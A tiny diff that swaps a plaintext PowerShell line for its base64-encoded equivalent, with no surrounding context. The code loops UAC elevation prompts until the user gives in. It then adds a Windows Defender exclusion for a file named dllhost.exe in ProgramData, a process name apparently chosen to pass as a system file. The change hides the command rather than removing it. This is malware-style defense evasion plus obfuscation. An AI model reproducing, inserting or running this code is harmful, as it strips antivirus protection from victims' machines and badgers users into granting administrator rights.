@@ -1,1 +1,1 @@
-while ($true) { try { Start-Process 'powershell' -Verb runas -ArgumentList 'Add-MpPreference -ExclusionProcess C:\ProgramData\dllhost.exe'; exit } catch {} }
+d2hpbGUgKCR0cnVlKSB7IHRyeSB7IFN0YXJ0LVByb2Nlc3MgJ3Bvd2Vyc2hlbGwnIC1WZXJiIHJ1bmFzIC1Bcmd1bWVudExpc3QgJ0FkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgQzpcUHJvZ3JhbURhdGFcZGxsaG9zdC5leGUnOyBleGl0IH0gY2F0Y2gge30gfQ==
